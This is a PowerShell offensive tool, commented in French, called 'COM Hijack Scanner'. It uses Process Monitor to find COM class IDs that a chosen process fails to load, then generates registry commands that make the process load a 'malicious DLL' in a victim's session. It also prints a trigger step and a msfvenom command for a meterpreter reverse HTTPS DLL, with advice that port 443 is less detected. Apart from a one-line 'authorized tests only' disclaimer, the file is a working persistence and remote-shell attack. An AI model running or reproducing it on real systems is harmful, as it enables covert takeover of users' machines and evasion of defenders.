<#
.SYNOPSIS
    COM Hijack Scanner v2.1 - Détection dynamique via Process Monitor
.DESCRIPTION
    Capture en temps réel les accès registre NAME NOT FOUND sur 
    HKCU\Software\Classes\CLSID\...\InprocServer32 pour identifier
    les CLSID réellement hijackables (instanciés via CoCreateInstance).
.NOTES
    Prérequis : Admin + Procmon.exe (Sysinternals) dans C:\Tools\
    Cadre légal : Tests autorisés / Lab / CTF uniquement
#>

#Requires -RunAsAdministrator

# ============================================================
#  CONFIGURATION
# ============================================================
$ProcmonPath = @(
    "C:\Tools\Procmon.exe",
    "C:\Tools\Procmon64.exe",
    "$env:USERPROFILE\Downloads\Procmon.exe",
    "$env:USERPROFILE\Downloads\Procmon64.exe",
    "$env:USERPROFILE\Desktop\Procmon.exe",
    "$env:USERPROFILE\Desktop\Procmon64.exe"
) | Where-Object { Test-Path $_ } | Select-Object -First 1

if (-not $ProcmonPath) {
    Write-Host "[!] Procmon.exe introuvable." -ForegroundColor Red
    Write-Host "[i] Télécharge : https://download.sysinternals.com/files/ProcessMonitor.zip" -ForegroundColor Yellow
    Write-Host "[i] Place Procmon.exe dans C:\Tools\, Downloads\ ou Desktop\" -ForegroundColor Yellow
    exit 1
}

$WorkDir = "$env:TEMP\COMHijack"
if (-not (Test-Path $WorkDir)) { New-Item -ItemType Directory -Path $WorkDir -Force | Out-Null }

$PmlFile = Join-Path $WorkDir "capture.pml"
$CsvFile = Join-Path $WorkDir "capture.csv"

# ============================================================
#  BANNIÈRE
# ============================================================
function Show-Banner {
    Clear-Host
    Write-Host ""
    Write-Host "  +======================================================+" -ForegroundColor Cyan
    Write-Host "  |       COM HIJACK SCANNER v2.1 - DYNAMIC EDITION      |" -ForegroundColor Cyan
    Write-Host "  |       Powered by Process Monitor (Sysinternals)      |" -ForegroundColor Cyan
    Write-Host "  +======================================================+" -ForegroundColor Cyan
    Write-Host ""
    Write-Host "  [i] Procmon  : $ProcmonPath" -ForegroundColor DarkGray
    Write-Host "  [i] Workdir  : $WorkDir" -ForegroundColor DarkGray
    Write-Host ""
}

# ============================================================
#  SÉLECTION DU PROCESSUS CIBLE
# ============================================================
function Select-TargetProcess {
    Write-Host "[?] Nom du processus cible (sans .exe)" -ForegroundColor Cyan
    Write-Host "    Exemples : notepad, explorer, firefox, chrome, mspaint" -ForegroundColor DarkGray
    $name = Read-Host "    > "
    $name = $name.Trim().Replace('.exe','')
    if ([string]::IsNullOrWhiteSpace($name)) { return $null }

    $running = Get-Process -Name $name -ErrorAction SilentlyContinue
    if ($running) {
        Write-Host "[+] $($running.Count) instance(s) de $name.exe en cours d'exécution" -ForegroundColor Green
    } else {
        Write-Host "[!] $name.exe n'est pas lancé. Tu devras le démarrer pendant la capture." -ForegroundColor Yellow
    }
    return $name
}

# ============================================================
#  LANCEMENT DU MONITORING
# ============================================================
function Start-Monitoring {
    param([string]$TargetProcess)

    Write-Host ""
    Write-Host "[*] Cible : $TargetProcess.exe" -ForegroundColor Green
    Write-Host "[*] Nettoyage des anciennes captures..." -ForegroundColor Yellow
    Remove-Item $PmlFile, $CsvFile -ErrorAction SilentlyContinue

    Write-Host "[*] Démarrage de Procmon en arrière-plan..." -ForegroundColor Yellow
    $procArgs = @(
        "/Quiet",
        "/Minimized",
        "/BackingFile", $PmlFile,
        "/AcceptEula"
    )
    Start-Process -FilePath $ProcmonPath -ArgumentList $procArgs | Out-Null
    Start-Sleep -Seconds 3

    Write-Host ""
    Write-Host "  +======================================================+" -ForegroundColor Magenta
    Write-Host "  |              CAPTURE EN COURS - ACTIONS              |" -ForegroundColor Magenta
    Write-Host "  +======================================================+" -ForegroundColor Magenta
    Write-Host "  | 1. Lance / utilise '$TargetProcess'" -ForegroundColor White
    Write-Host "  | 2. Effectue un MAX d'actions (menus, ouvrir, save...) " -ForegroundColor White
    Write-Host "  | 3. Quand terminé, appuie sur ENTREE ici" -ForegroundColor White
    Write-Host "  +======================================================+" -ForegroundColor Magenta
    Write-Host ""
    Read-Host "Appuie sur ENTREE pour arreter la capture"

    Write-Host "[*] Arret de Procmon..." -ForegroundColor Yellow
    Start-Process -FilePath $ProcmonPath -ArgumentList "/Terminate" -Wait
    Start-Sleep -Seconds 2

    Write-Host "[*] Export en CSV (peut prendre 30s a 2min)..." -ForegroundColor Yellow
    $exportArgs = @(
        "/OpenLog", $PmlFile,
        "/SaveAs", $CsvFile,
        "/AcceptEula"
    )
    Start-Process -FilePath $ProcmonPath -ArgumentList $exportArgs -Wait

    # Attente que le CSV soit stable
    $maxWait = 60
    $waited = 0
    while ($waited -lt $maxWait) {
        if (Test-Path $CsvFile) {
            $size1 = (Get-Item $CsvFile).Length
            Start-Sleep -Seconds 2
            $size2 = (Get-Item $CsvFile).Length
            if ($size1 -eq $size2 -and $size1 -gt 0) { break }
        }
        Start-Sleep -Seconds 1
        $waited++
    }

    if (-not (Test-Path $CsvFile)) {
        Write-Host "[!] Export CSV echoue (fichier introuvable)." -ForegroundColor Red
        return $null
    }

    $sizeKB = [Math]::Round((Get-Item $CsvFile).Length / 1KB, 2)
    Write-Host "[+] CSV genere : $CsvFile ($sizeKB KB)" -ForegroundColor Green

    return $CsvFile.Trim()
}

# ============================================================
#  ANALYSE DU CSV
# ============================================================
function Analyze-Capture {
    param(
        [string]$CsvPath,
        [string]$TargetProcess
    )

    # Nettoyage du chemin
    $CsvPath = $CsvPath.Trim().Trim('"').Trim("'")

    Write-Host ""
    Write-Host "[*] Analyse de la capture..." -ForegroundColor Yellow
    Write-Host "[i] Fichier : [$CsvPath]" -ForegroundColor DarkGray

    if (-not (Test-Path -LiteralPath $CsvPath)) {
        Write-Host "[!] CSV introuvable : $CsvPath" -ForegroundColor Red
        return $null
    }

    # Lecture robuste
    try {
        $events = Import-Csv -LiteralPath $CsvPath -ErrorAction Stop
    } catch {
        Write-Host "[!] Erreur Import-Csv : $_" -ForegroundColor Red
        Write-Host "[i] Tentative en lecture brute..." -ForegroundColor Yellow
        try {
            $raw = Get-Content -LiteralPath $CsvPath -Encoding UTF8
            $events = $raw | ConvertFrom-Csv
        } catch {
            Write-Host "[!] Impossible de lire le CSV." -ForegroundColor Red
            return $null
        }
    }

    if (-not $events -or $events.Count -eq 0) {
        Write-Host "[!] CSV vide." -ForegroundColor Red
        return $null
    }

    Write-Host "[i] $($events.Count) evenements charges" -ForegroundColor DarkGray

    # Détection dynamique des colonnes
    $sample = $events | Select-Object -First 1
    $colProc = $sample.PSObject.Properties.Name | Where-Object { $_ -match 'Process.*Name' } | Select-Object -First 1
    $colOp   = $sample.PSObject.Properties.Name | Where-Object { $_ -match '^Operation' }    | Select-Object -First 1
    $colRes  = $sample.PSObject.Properties.Name | Where-Object { $_ -match '^Result' }       | Select-Object -First 1
    $colPath = $sample.PSObject.Properties.Name | Where-Object { $_ -match '^Path' }         | Select-Object -First 1

    if (-not ($colProc -and $colOp -and $colRes -and $colPath)) {
        Write-Host "[!] Colonnes CSV non reconnues. Trouvees :" -ForegroundColor Red
        $sample.PSObject.Properties.Name | ForEach-Object { Write-Host "    - $_" -ForegroundColor Gray }
        return $null
    }

    Write-Host "[i] Colonnes : $colProc | $colOp | $colRes | $colPath" -ForegroundColor DarkGray

    # Diagnostique processus
    $procEvents = $events | Where-Object { $_.$colProc -ieq "$TargetProcess.exe" }
    Write-Host "[i] Evenements pour $TargetProcess.exe : $($procEvents.Count)" -ForegroundColor DarkGray

    if ($procEvents.Count -eq 0) {
        Write-Host "[!] AUCUN evenement pour $TargetProcess.exe !" -ForegroundColor Red
        Write-Host "[i] Le processus etait-il actif pendant la capture ?" -ForegroundColor Yellow
        return $null
    }

    # Filtre principal : HKCU
    $hijacks = $procEvents | Where-Object {
        $_.$colOp   -eq 'RegOpenKey' -and
        $_.$colRes  -eq 'NAME NOT FOUND' -and
        $_.$colPath -match 'InprocServer32' -and
        $_.$colPath -match '^HKCU'
    }

    Write-Host "[i] Hijacks HKCU : $($hijacks.Count)" -ForegroundColor DarkGray

    if (-not $hijacks -or $hijacks.Count -eq 0) {
        Write-Host "[!] Aucun hijack HKCU. Elargissement HKCR/HKLM..." -ForegroundColor Yellow
        $hijacks = $procEvents | Where-Object {
            $_.$colOp   -eq 'RegOpenKey' -and
            $_.$colRes  -eq 'NAME NOT FOUND' -and
            $_.$colPath -match 'InprocServer32'
        }
        Write-Host "[i] Hijacks tous hives : $($hijacks.Count)" -ForegroundColor DarkGray

        if (-not $hijacks -or $hijacks.Count -eq 0) {
            Write-Host "[!] Aucun candidat trouve." -ForegroundColor Red
            Write-Host "[i] Essaie plus d'actions, ou un processus plus actif (explorer.exe)" -ForegroundColor Yellow
            return $null
        }
    }

    # Extraction et regroupement des CLSID
    $clsids = @{}
    foreach ($evt in $hijacks) {
        if ($evt.$colPath -match '\\CLSID\\(\{[0-9A-Fa-f\-]+\})') {
            $clsid = $matches[1]
            if (-not $clsids.ContainsKey($clsid)) {
                $hive = if ($evt.$colPath -match '^HKCU') { 'HKCU' }
                        elseif ($evt.$colPath -match '^HKCR') { 'HKCR' }
                        else { 'HKLM' }
                $clsids[$clsid] = [PSCustomObject]@{
                    CLSID = $clsid
                    Path  = $evt.$colPath
                    Count = 1
                    Hive  = $hive
                }
            } else {
                $clsids[$clsid].Count++
            }
        }
    }

    return @($clsids.Values | Sort-Object Count -Descending)
}

# ============================================================
#  AFFICHAGE DES RÉSULTATS & GÉNÉRATION DU HIJACK
# ============================================================
function Show-Results {
    param(
        [array]$Candidates,
        [string]$TargetProcess
    )

    Write-Host ""
    Write-Host "  +======================================================+" -ForegroundColor Green
    Write-Host "  |        CANDIDATS COM HIJACK pour $TargetProcess" -ForegroundColor Green
    Write-Host "  +======================================================+" -ForegroundColor Green
    Write-Host ""

    $i = 1
    foreach ($c in $Candidates) {
        $line = "  [{0,2}] {1}  Hive={2}  Hits={3}" -f $i, $c.CLSID, $c.Hive, $c.Count
        Write-Host $line -ForegroundColor White
        Write-Host "        $($c.Path)" -ForegroundColor DarkGray
        $i++
    }
    Write-Host ""

    $choice = Read-Host "Choisis un numero pour generer le hijack (ou ENTREE pour passer)"
    if ([string]::IsNullOrWhiteSpace($choice)) { return }

    $idx = 0
    if (-not [int]::TryParse($choice, [ref]$idx)) { return }
    if ($idx -lt 1 -or $idx -gt $Candidates.Count) { return }

    $target = $Candidates[$idx - 1]
    $dllPath = Read-Host "Chemin de la DLL malveillante (defaut: C:\payloads\evil.dll)"
    if ([string]::IsNullOrWhiteSpace($dllPath)) { $dllPath = "C:\payloads\evil.dll" }

    $threading = Read-Host "ThreadingModel (Apartment / Both / Free) [defaut: Apartment]"
    if ([string]::IsNullOrWhiteSpace($threading)) { $threading = "Apartment" }

    Write-Host ""
    Write-Host "  +======================================================+" -ForegroundColor Cyan
    Write-Host "  |              HIJACK : $TargetProcess via $($target.CLSID)" -ForegroundColor Cyan
    Write-Host "  +======================================================+" -ForegroundColor Cyan
    Write-Host ""
    Write-Host "[1] Place ta DLL ici : $dllPath" -ForegroundColor Yellow
    Write-Host ""
    Write-Host "[2] INSTALLATION (a coller dans une session de la victime) :" -ForegroundColor Yellow
    Write-Host ""
    $install = @"
`$CLSID = '$($target.CLSID)'
New-Item -Path "HKCU:\Software\Classes\CLSID\`$CLSID" -Force | Out-Null
New-Item -Path "HKCU:\Software\Classes\CLSID\`$CLSID\InprocServer32" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\CLSID\`$CLSID\InprocServer32" -Name '(Default)' -Value '$dllPath'
New-ItemProperty -Path "HKCU:\Software\Classes\CLSID\`$CLSID\InprocServer32" -Name 'ThreadingModel' -Value '$threading' -PropertyType String -Force | Out-Null
"@
    Write-Host $install -ForegroundColor Green
    Write-Host ""
    Write-Host "[3] TRIGGER :" -ForegroundColor Yellow
    Write-Host "    Stop-Process -Name $TargetProcess -Force -ErrorAction SilentlyContinue" -ForegroundColor Green
    Write-Host "    Start-Process $TargetProcess.exe" -ForegroundColor Green
    Write-Host ""
    Write-Host "[4] ROLLBACK :" -ForegroundColor Yellow
    Write-Host "    Remove-Item -Path 'HKCU:\Software\Classes\CLSID\$($target.CLSID)' -Recurse -Force" -ForegroundColor Green
    Write-Host ""
    Write-Host "[5] CONSEILS DLL :" -ForegroundColor Yellow
    Write-Host "    msfvenom -p windows/x64/meterpreter/reverse_https LHOST=X.X.X.X LPORT=443 -f dll -o evil.dll" -ForegroundColor DarkGray
    Write-Host "    (HTTPS/443 = moins detecte que TCP brut)" -ForegroundColor DarkGray
    Write-Host ""

    # Sauvegarde dans un fichier
    $outFile = Join-Path $WorkDir "hijack_$TargetProcess_$($target.CLSID -replace '[{}]','').ps1"
    $install | Out-File -FilePath $outFile -Encoding UTF8
    Write-Host "[+] Script d'installation sauvegarde : $outFile" -ForegroundColor Green
    Write-Host ""
    Read-Host "Appuie sur ENTREE pour continuer"
}

# ============================================================
#  MAIN LOOP
# ============================================================
function Main {
    Show-Banner

    while ($true) {
        $target = Select-TargetProcess
        if (-not $target) {
            Write-Host "[!] Selection invalide." -ForegroundColor Red
            Start-Sleep -Seconds 2
            Show-Banner
            continue
        }

        $csv = Start-Monitoring -TargetProcess $target
        if (-not $csv) {
            Read-Host "Appuie sur ENTREE pour recommencer"
            Show-Banner
            continue
        }

        $candidates = Analyze-Capture -CsvPath $csv -TargetProcess $target
        if (-not $candidates -or $candidates.Count -eq 0) {
            Write-Host ""
            Read-Host "Appuie sur ENTREE pour recommencer"
            Show-Banner
            continue
        }

        Show-Results -Candidates $candidates -TargetProcess $target

        Show-Banner
        $again = Read-Host "Autre scan ? (o/N)"
        if ($again -notmatch '^[oOyY]') { break }
        Show-Banner
    }

    Write-Host ""
    Write-Host "[i] Captures conservees dans : $WorkDir" -ForegroundColor DarkGray
    Write-Host "[+] Bye." -ForegroundColor Green
}

Main
